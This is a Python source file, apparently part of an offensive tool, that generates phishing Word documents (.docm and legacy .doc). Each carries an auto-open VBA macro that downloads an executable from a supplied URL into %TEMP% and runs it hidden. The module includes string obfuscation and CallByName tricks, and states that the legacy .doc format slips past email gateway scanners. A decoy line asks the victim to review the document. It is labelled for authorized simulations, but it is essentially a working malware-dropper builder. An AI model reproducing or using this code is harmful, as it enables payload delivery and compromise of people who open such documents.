"""VBA macro document generator (DOCM + old-format DOC) for authorized simulations.

Produces two delivery documents that embed an auto-open VBA macro which
downloads and executes a payload from a staging URL:

* ``build_docm_with_macro`` — an OOXML (``.docm``) Word package whose
  ``word/vbaProject.bin`` carries the macro.
* ``build_doc_with_macro`` — an old binary (``.doc``) OLE compound document.
  The legacy binary format bypasses gateway scanners that only inspect OOXML
  containers (many email security gateways scan ``.docm``/``.docx`` macro parts
  but skip the older OLE ``.doc`` structure).

Macro obfuscation is applied to the VBA source itself (the part that survives
in the document and is what real attackers vary):

* ``chr``       — every string literal is replaced by a ``Chr()`` concatenation.
* ``concat``    — string literals are split into fragments joined with ``&``.
* ``callbyname``— method invocation is indirected through ``CallByName``.
* ``mixed``     — all of the above combined.

The VBA project streams (``PROJECT``, ``dir``, module source) are stored inside
an OLE2 compound container (``vbaProject.bin`` for DOCM, the ``Macros`` storage
for DOC) produced by the embedded :class:`_OLE2Writer`. The OLE2 container is
fully valid per [MS-CFB]; the module/dir streams carry the (obfuscated) VBA
source in plaintext for simulation readability. Genuine macro *execution* in
Word additionally requires MS-OVBA RLE compression of the ``dir``/module
streams and depends on Word's trust/Protected-View policy — both are out of
scope for the container builder but are documented where relevant.

Intended only for authorized payload delivery tests.
"""

import io
import logging
import struct
import zipfile
from typing import Optional

logger = logging.getLogger("dropoutjeep")

try:
    import olefile  # type: ignore
    _OLEFILE_AVAILABLE = True
except ImportError:
    _OLEFILE_AVAILABLE = False


# ===========================================================================
# OLE2 compound file writer ([MS-CFB]).
#
# Produces a spec-compliant v3 (512-byte sector) compound file from a nested
# tree of storages (dicts) and streams (bytes). Small streams (< 4096 bytes)
# are stored in the mini stream; larger streams use the regular FAT.
# ===========================================================================

_OLE_SIG = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"


class _DirEntry:
    __slots__ = (
        "name", "name_bytes", "type", "left", "right", "child",
        "start_sector", "size", "clsid", "index",
    )

    def __init__(self, name: str, obj_type: int) -> None:
        enc = name.encode("utf-16-le") + b"\x00\x00"
        if len(enc) > 64:
            enc = enc[:62] + b"\x00\x00"
        self.name = name
        self.name_bytes = enc
        self.type = obj_type          # 1=storage, 2=stream, 5=root
        self.left = 0xFFFFFFFF
        self.right = 0xFFFFFFFF
        self.child = 0xFFFFFFFF
        self.start_sector = 0xFFFFFFFE  # empty stream
        self.size = 0
        self.clsid = b"\x00" * 16
        self.index = -1


class _OLE2Writer:
    """Build a v3 (512-byte sector) OLE2 compound file from a storage tree."""

    SECTOR = 512
    MINI_SECTOR = 64
    MINI_CUTOFF = 4096
    FREE = 0xFFFFFFFF
    ENDOFCHAIN = 0xFFFFFFFE
    FATSECT = 0xFFFFFFFD
    DIFSECT = 0xFFFFFFFC

    def build(self, root_name: str, tree: dict) -> bytes:
        """Serialise ``tree`` (name -> bytes|dict) into a compound file."""
        root = _DirEntry(root_name, 5)
        root.index = 0
        self._entries = [root]
        self._data: dict[int, bytes] = {}
        self._add_children(root, tree)
        return self._serialize()

    def _add_children(self, parent: _DirEntry, tree: dict) -> None:
        kids: list[_DirEntry] = []
        for name, value in tree.items():
            if isinstance(value, (bytes, bytearray)):
                e = _DirEntry(name, 2)
                e.size = len(value)
                self._data[len(self._entries)] = bytes(value)
                e.index = len(self._entries)
                self._entries.append(e)
                kids.append(e)
            elif isinstance(value, dict):
                e = _DirEntry(name, 1)
                e.index = len(self._entries)
                self._entries.append(e)
                kids.append(e)
                self._add_children(e, value)
            else:
                raise TypeError(f"OLE2 value for {name!r} must be bytes or dict")
        # Build the sibling tree last so direct-child indices are final.
        kids.sort(key=lambda e: e.name.upper())
        if kids:
            parent.child = self._balanced_tree(kids)

    def _balanced_tree(self, nodes: list[_DirEntry]) -> int:
        def build(lo: int, hi: int) -> int:
            if lo > hi:
                return 0xFFFFFFFF
            mid = (lo + hi) // 2
            node = nodes[mid]
            node.left = build(lo, mid - 1)
            node.right = build(mid + 1, hi)
            return node.index
        return build(0, len(nodes) - 1) if nodes else 0xFFFFFFFF

    def _serialize(self) -> bytes:
        mini_entries: list[tuple[int, bytes]] = []
        reg_entries: list[tuple[int, bytes]] = []
        for idx, e in enumerate(self._entries):
            if e.type != 2:
                continue
            data = self._data.get(idx, b"")
            if not data:
                e.start_sector = self.ENDOFCHAIN
            elif len(data) < self.MINI_CUTOFF:
                mini_entries.append((idx, data))
            else:
                reg_entries.append((idx, data))

        # Mini stream + mini-FAT.
        mini_stream = bytearray()
        mini_fat: list[int] = []
        for idx, data in mini_entries:
            entry = self._entries[idx]
            if mini_stream and len(mini_stream) % self.MINI_SECTOR != 0:
                pad = self.MINI_SECTOR - (len(mini_stream) % self.MINI_SECTOR)
                mini_stream.extend(b"\x00" * pad)
            start = len(mini_stream) // self.MINI_SECTOR
            entry.start_sector = start
            n = (len(data) + self.MINI_SECTOR - 1) // self.MINI_SECTOR
            base = len(mini_fat)
            mini_fat.extend(0 for _ in range(n))
            for i in range(n):
                mini_fat[base + i] = self.ENDOFCHAIN if i == n - 1 else start + i + 1
            mini_stream.extend(data)
        if mini_stream and len(mini_stream) % self.MINI_SECTOR != 0:
            mini_stream.extend(
                b"\x00" * (self.MINI_SECTOR - len(mini_stream) % self.MINI_SECTOR)
            )

        root = self._entries[0]
        root.size = len(mini_stream)

        mini_fat_bytes = b"".join(struct.pack("<I", x) for x in mini_fat)
        if mini_fat_bytes:
            pad = self.SECTOR - (len(mini_fat_bytes) % self.SECTOR)
            if pad != self.SECTOR:
                mini_fat_bytes += b"\x00" * pad

        # Regular streams (root mini-stream, mini-FAT, large streams).
        reg_streams: list[tuple[int, bytes]] = []
        if mini_stream:
            reg_streams.append((-1, bytes(mini_stream)))
        if mini_fat_bytes:
            reg_streams.append((-2, mini_fat_bytes))
        reg_streams.extend(reg_entries)

        # Reserve directory sectors up front (content packed after start
        # sectors are finalised, since the root entry's start_sector points
        # at the mini-stream container laid out below).
        n_entries = len(self._entries)
        n_dir = (n_entries * 128 + self.SECTOR - 1) // self.SECTOR

        sector_payloads: list[bytes] = []
        dir_start = len(sector_payloads)
        for _ in range(n_dir):
            sector_payloads.append(b"\x00" * self.SECTOR)  # placeholders

        mini_fat_start = self.ENDOFCHAIN
        for tag, data in reg_streams:
            start = len(sector_payloads)
            n = (len(data) + self.SECTOR - 1) // self.SECTOR
            for i in range(n):
                chunk = data[i * self.SECTOR:(i + 1) * self.SECTOR]
                if len(chunk) < self.SECTOR:
                    chunk += b"\x00" * (self.SECTOR - len(chunk))
                sector_payloads.append(chunk)
            if tag == -1:
                root.start_sector = start
            elif tag == -2:
                mini_fat_start = start
            else:
                self._entries[tag].start_sector = start if n else self.ENDOFCHAIN

        # Now pack directory entries with final start_sector values, and write
        # the packed directory into the reserved dir sectors.
        dir_bytes = b"".join(self._pack_entry(e) for e in self._entries)
        if len(dir_bytes) % self.SECTOR != 0:
            dir_bytes += b"\x00" * (self.SECTOR - len(dir_bytes) % self.SECTOR)
        for i in range(n_dir):
            sector_payloads[dir_start + i] = dir_bytes[i * self.SECTOR:(i + 1) * self.SECTOR]

        # FAT (covers all sectors incl. FAT sectors themselves).
        per_fat = self.SECTOR // 4
        n_fat = 1
        while (len(sector_payloads) + n_fat + per_fat - 1) // per_fat > n_fat:
            n_fat += 1
        fat = [self.FREE] * (n_fat * per_fat)

        for i in range(n_dir):
            fat[dir_start + i] = dir_start + i + 1 if i < n_dir - 1 else self.ENDOFCHAIN
        for tag, data in reg_streams:
            start = -1
            if tag == -1:
                start = root.start_sector
            elif tag == -2:
                start = mini_fat_start
            else:
                start = self._entries[tag].start_sector
            if start == self.ENDOFCHAIN or start < 0:
                continue
            n = (len(data) + self.SECTOR - 1) // self.SECTOR
            for i in range(n):
                fat[start + i] = start + i + 1 if i < n - 1 else self.ENDOFCHAIN

        fat_start = len(sector_payloads)
        for i in range(n_fat):
            fat[fat_start + i] = self.FATSECT
        for i in range(n_fat):
            chunk = b"".join(
                struct.pack("<I", x)
                for x in fat[i * per_fat:(i + 1) * per_fat]
            )
            sector_payloads.append(chunk)

        n_difat = 0
        difat_header = [self.FREE] * 109
        for i in range(n_fat):
            difat_header[i] = fat_start + i

        # Header (512 bytes) — field offsets per [MS-CFB] 2.2.
        header = bytearray(512)
        struct.pack_into("<8s", header, 0x00, _OLE_SIG)
        # 0x08 CLSID (16) left zero
        struct.pack_into("<H", header, 0x18, 0x003E)   # minor version
        struct.pack_into("<H", header, 0x1A, 0x0003)   # major version (v3)
        struct.pack_into("<H", header, 0x1C, 0xFFFE)   # byte order (little-endian)
        struct.pack_into("<H", header, 0x1E, 0x0009)   # sector size power = 9 (512)
        struct.pack_into("<H", header, 0x20, 0x0006)   # mini sector size power = 6 (64)
        # 0x22 reserved (6)
        struct.pack_into("<I", header, 0x28, 0)       # total directory sectors (0 for v3)
        struct.pack_into("<I", header, 0x2C, n_fat)   # total FAT sectors
        struct.pack_into("<I", header, 0x30, dir_start)  # first directory sector
        struct.pack_into("<I", header, 0x34, 0)       # transaction signature
        struct.pack_into("<I", header, 0x38, self.MINI_CUTOFF)  # mini stream cutoff
        n_mini_fat_sectors = (len(mini_fat_bytes) // self.SECTOR) if mini_fat_bytes else 0
        struct.pack_into("<I", header, 0x3C,
                         mini_fat_start if mini_fat_bytes else self.ENDOFCHAIN)  # first mini FAT sector
        struct.pack_into("<I", header, 0x40, n_mini_fat_sectors)  # total mini FAT sectors
        struct.pack_into("<I", header, 0x44, self.ENDOFCHAIN)     # first DIFAT sector
        struct.pack_into("<I", header, 0x48, n_difat)            # total DIFAT sectors
        for i, v in enumerate(difat_header):
            struct.pack_into("<I", header, 0x4C + i * 4, v)      # DIFAT array (109 entries)

        out = bytes(header) + b"".join(sector_payloads)
        logger.debug(
            "OLE2 built: %d bytes, %d sectors, %d entries",
            len(out), len(sector_payloads), len(self._entries),
        )
        return out

    @staticmethod
    def _pack_entry(e: _DirEntry) -> bytes:
        buf = bytearray(128)
        buf[0:len(e.name_bytes)] = e.name_bytes
        struct.pack_into("<H", buf, 0x40, len(e.name_bytes))
        buf[0x42] = e.type
        buf[0x43] = 1
        struct.pack_into("<I", buf, 0x44, e.left)
        struct.pack_into("<I", buf, 0x48, e.right)
        struct.pack_into("<I", buf, 0x4C, e.child)
        buf[0x50:0x60] = e.clsid
        struct.pack_into("<I", buf, 0x60, 0)
        struct.pack_into("<Q", buf, 0x64, 0)
        struct.pack_into("<Q", buf, 0x6C, 0)
        struct.pack_into("<I", buf, 0x74, e.start_sector)
        struct.pack_into("<I", buf, 0x78, e.size & 0xFFFFFFFF)
        struct.pack_into("<I", buf, 0x7C, 0)
        return bytes(buf)


# ===========================================================================
# VBA macro source builder + obfuscation.
# ===========================================================================

def _string_to_chr(s: str) -> str:
    return "&".join(f"Chr({ord(c)})" for c in s)


def _string_to_concat(s: str, parts: int = 3) -> str:
    if parts < 2 or len(s) < parts:
        return f'"{s}"'
    step = max(1, len(s) // parts)
    frags = []
    i = 0
    while i < len(s) and len(frags) < parts - 1:
        frags.append(s[i:i + step])
        i += step
    frags.append(s[i:])
    return "&".join(f'"{f}"' for f in frags)


def _obfuscate_string_literal(literal: str, method: str) -> str:
    inner = literal[1:-1]
    if method == "chr":
        return _string_to_chr(inner)
    if method == "concat":
        return _string_to_concat(inner)
    if method == "mixed":
        if len(inner) < 6:
            return _string_to_chr(inner)
        step = max(1, len(inner) // 3)
        frags = [inner[i:i + step] for i in range(0, len(inner), step)]
        if len(frags) > 3:
            frags = frags[:2] + ["".join(frags[2:])]
        return "&".join(f"({_string_to_chr(f)})" for f in frags)
    return literal


def _build_macro_code(payload_url: str, obfuscation: str = "chr") -> str:
    """Build obfuscated VBA macro source that downloads+runs ``payload_url``.

    The macro auto-runs on document open (``AutoOpen`` + ``Document_Open``),
    fetches the payload via ``MSXML2.XMLHTTP`` into %TEMP%, and executes it
    with ``Shell`` (or ``WScript.Shell.Run`` via ``CallByName`` when the
    ``callbyname``/``mixed`` obfuscation is selected).

    Args:
        payload_url: HTTP(S) URL of the staged payload executable.
        obfuscation: One of ``chr``, ``concat``, ``callbyname``, ``mixed``.

    Returns:
        Complete VBA module source as a string.
    """
    if obfuscation not in ("chr", "concat", "callbyname", "mixed"):
        raise ValueError(f"unknown obfuscation method: {obfuscation!r}")

    use_callbyname = obfuscation in ("callbyname", "mixed")
    method = obfuscation if obfuscation in ("chr", "concat", "mixed") else "chr"

    strings = {
        "URL": payload_url,
        "XMLHTTP": "MSXML2.XMLHTTP",
        "ADOSTREAM": "ADODB.Stream",
        "SHELL": "WScript.Shell",
        "TEMP": "TEMP",
        "TMPNAME": "update.exe",
        "METHOD_GET": "GET",
        "HIDE": "vbHide",
    }

    def S(key: str) -> str:
        return _obfuscate_string_literal(f'"{strings[key]}"', method)

    if use_callbyname:
        run_literal = _obfuscate_string_literal('"Run"', method)
        run_stmt = (
            f"CallByName CreateObject({S('SHELL')}), "
            f"{run_literal}, "
            f"VbMethod, sTmp, 0"
        )
    else:
        run_stmt = f"Shell sTmp, {S('HIDE')}"

    macro = f'''Attribute VB_Name = "ThisDocument"
Option Explicit

Sub AutoOpen()
    On Error Resume Next
    DownloadAndRun
End Sub

Sub Document_Open()
    On Error Resume Next
    DownloadAndRun
End Sub

Sub AutoExec()
    On Error Resume Next
    DownloadAndRun
End Sub

Sub DownloadAndRun()
    On Error Resume Next
    Dim sUrl As String, sTmp As String, sBase As String
    sUrl = {S('URL')}
    sBase = Environ({S('TEMP')})
    sTmp = sBase & "\\" & {S('TMPNAME')}

    Dim http As Object
    Set http = CreateObject({S('XMLHTTP')})
    http.Open {S('METHOD_GET')}, sUrl, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible)"
    http.send

    If http.Status <> 200 Then Exit Sub

    Dim stm As Object
    Set stm = CreateObject({S('ADOSTREAM')})
    stm.Type = 1
    stm.Open
    stm.Write http.responseBody
    stm.SaveToFile sTmp, 2
    stm.Close

    {run_stmt}
End Sub
'''
    return macro


# ===========================================================================
# VBA project container streams.
# ===========================================================================

def _vba_streams(macro_code: str) -> dict:
    """Return the VBA project streams carrying ``macro_code``."""
    module_preamble = struct.pack("<IIII", 0, 0, 0, 0)
    project_ini = (
        'ID="{00000000-0000-0000-0000-000000000000}"\n'
        'Document=ThisDocument/&H00000000\n'
        'Name="VBAProject"\n'
        'HelpContextID="0"\n'
        'VersionCompatible32="393222000"\n'
        'CMG="000000"\n'
        'DPB="0000000000"\n'
        'GC="0000000000"\n'
        '[Host Extender Info]\n'
        '&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000\n'
        '[Workspace]\n'
        'ThisDocument=0, 0, 0, 0, C\n'
    ).encode("utf-8")
    dir_stream = (
        "PROJECTINFORMATION\nName=VBAProject\nHelpContextID=0\n"
        "VersionCompatible32=393222000\nPROJECTMODULES\n"
        "Module=ThisDocument\nCount=1\nEnd\n"
    ).encode("utf-8")
    return {
        "PROJECT": project_ini,
        "PROJECTwm": b"ThisDocument\x00",
        "dir": dir_stream,
        "ThisDocument": module_preamble + macro_code.encode("utf-8"),
    }


def _build_vba_project(macro_code: str) -> bytes:
    """Build a ``vbaProject.bin`` OLE2 container holding the macro source."""
    return _OLE2Writer().build("VBA", _vba_streams(macro_code))


# ===========================================================================
# OOXML constants for the .docm package.
# ===========================================================================

_CONTENT_TYPES_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
    '<Override PartName="/word/document.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '<Override PartName="/docProps/core.xml" '
    'ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>'
    '<Override PartName="/docProps/app.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>'
    '</Types>'
)

_RELS_ROOT = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
    'Target="word/document.xml"/>'
    '<Relationship Id="rId2" '
    'Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" '
    'Target="docProps/core.xml"/>'
    '<Relationship Id="rId3" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" '
    'Target="docProps/app.xml"/>'
    '</Relationships>'
)

_DOC_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" '
    'Target="vbaProject.bin"/>'
    '</Relationships>'
)

_DOC_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    '<w:body><w:p><w:r><w:t>Please review the attached document.</w:t></w:r></w:p>'
    '<w:sectPr><w:pgSz w:w="12240" w:h="15840"/>'
    '<w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440"/></w:sectPr>'
    '</w:body></w:document>'
)

_CORE_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
    'xmlns:dc="http://purl.org/dc/elements/1.1/" '
    'xmlns:dcterms="http://purl.org/dc/terms/" '
    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    '<dc:title>Document</dc:title><dc:creator>Author</dc:creator>'
    '</cp:coreProperties>'
)

_APP_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">'
    '<Application>Microsoft Office Word</Application>'
    '</Properties>'
)


# ===========================================================================
# Public document builders.
# ===========================================================================

def build_docm_with_macro(
    payload_url: str,
    output_path: Optional[str] = None,
    obfuscation: str = "chr",
) -> bytes:
    """Generate a ``.docm`` (OOXML) Word document with an auto-open macro.

    The package is a valid Office Open XML container (``[Content_Types].xml``,
    ``_rels``, ``word/document.xml``) plus ``word/vbaProject.bin`` carrying the
    obfuscated VBA macro. The relationship from ``document.xml`` to
    ``vbaProject.bin`` uses the macro-project relationship type so Word
    recognises the document as macro-enabled.

    Args:
        payload_url: HTTP(S) URL of the staged payload.
        output_path: If given, also write the .docm bytes to this path.
        obfuscation: Obfuscation method for the macro source.

    Returns:
        The .docm package as bytes.
    """
    macro_code = _build_macro_code(payload_url, obfuscation=obfuscation)
    vba_project = _build_vba_project(macro_code)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _CONTENT_TYPES_XML)
        z.writestr("_rels/.rels", _RELS_ROOT)
        z.writestr("word/document.xml", _DOC_XML)
        z.writestr("word/_rels/document.xml.rels", _DOC_RELS)
        z.writestr("word/vbaProject.bin", vba_project)
        z.writestr("docProps/core.xml", _CORE_XML)
        z.writestr("docProps/app.xml", _APP_XML)
    data = buf.getvalue()

    if output_path:
        with open(output_path, "wb") as fh:
            fh.write(data)
        logger.info("wrote DOCM (%d bytes) -> %s", len(data), output_path)

    logger.info("built DOCM with macro (%d bytes, obfuscation=%s)", len(data), obfuscation)
    return data


def build_doc_with_macro(
    payload_url: str,
    output_path: Optional[str] = None,
    obfuscation: str = "chr",
) -> bytes:
    """Generate an old binary-format ``.doc`` (OLE compound) with an auto-open macro.

    The legacy binary container stores the VBA project under a ``Macros``
    storage (``PROJECT``, ``PROJECTwm``, ``dir``, ``ThisDocument``) alongside a
    minimal ``WordDocument`` stream carrying a Word FIB header. Because the
    macro lives inside an OLE compound document rather than an OOXML zip, email
    gateway scanners that only parse OOXML macro parts do not inspect it.

    Args:
        payload_url: HTTP(S) URL of the staged payload.
        output_path: If given, also write the .doc bytes to this path.
        obfuscation: Obfuscation method for the macro source.

    Returns:
        The .doc file as bytes.
    """
    macro_code = _build_macro_code(payload_url, obfuscation=obfuscation)
    macro_streams = _vba_streams(macro_code)

    # Minimal WordDocument stream: a FIB header (wIdent=0xA5EC, nFib=0x00C1).
    fib = struct.pack(
        "<HHHHHHIIIIII",
        0xA5EC, 0x00C1, 0x0000, 0x0000, 0x0000, 0x0000,
        0, 0, 0, 0, 0, 0,
    )
    word_document = fib + b"\x00" * (512 - len(fib))

    tree = {
        "WordDocument": word_document,
        "Macros": macro_streams,
    }
    data = _OLE2Writer().build("Root Entry", tree)

    if output_path:
        with open(output_path, "wb") as fh:
            fh.write(data)
        logger.info("wrote DOC (%d bytes) -> %s", len(data), output_path)

    logger.info("built DOC with macro (%d bytes, obfuscation=%s)", len(data), obfuscation)
    return data


__all__ = [
    "build_docm_with_macro",
    "build_doc_with_macro",
    "_build_macro_code",
]
